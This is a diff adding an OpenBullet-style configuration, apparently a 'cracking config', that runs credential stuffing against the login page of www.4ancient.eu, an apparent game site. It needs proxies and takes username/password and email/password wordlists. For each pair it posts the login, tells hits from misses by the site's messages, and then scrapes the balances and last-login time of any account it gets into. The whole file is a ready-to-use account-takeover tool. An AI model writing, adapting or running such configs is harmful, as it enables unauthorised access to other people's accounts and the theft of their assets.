@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "4ancient",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:48:48.628853+00:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.4ancient.eu/login.php" Multipart 
+  
+  STRINGCONTENT "accountname: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  BOUNDARY "----WebKitFormBoundaryZUfALAiTo0z5EAfB" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.4ancient.eu" 
+  HEADER "Origin: https://www.4ancient.eu" 
+  HEADER "Referer: https://www.4ancient.eu/login.php" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You logged in succesfullly" 
+  KEYCHAIN Failure OR 
+    KEY "The login failed. Check your data and try it again" 
+REQUEST GET "https://www.4ancient.eu/userindex.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"credits\"><p><em id=\"user_bp\">" "</em> BP</p><div class=\"coins\"></div></div> " -> CAP "BP" 
+PARSE "<SOURCE>" LR "<div class=\"credits\"><p><em id=\"user_ms\">" "</em> MS</p><div class=\"stones\"></div></div>" -> CAP "MS" 
+PARSE "<SOURCE>" LR "<div class=\"last-login\"> Last Login: " "</div>" -> CAP "Last Login" 
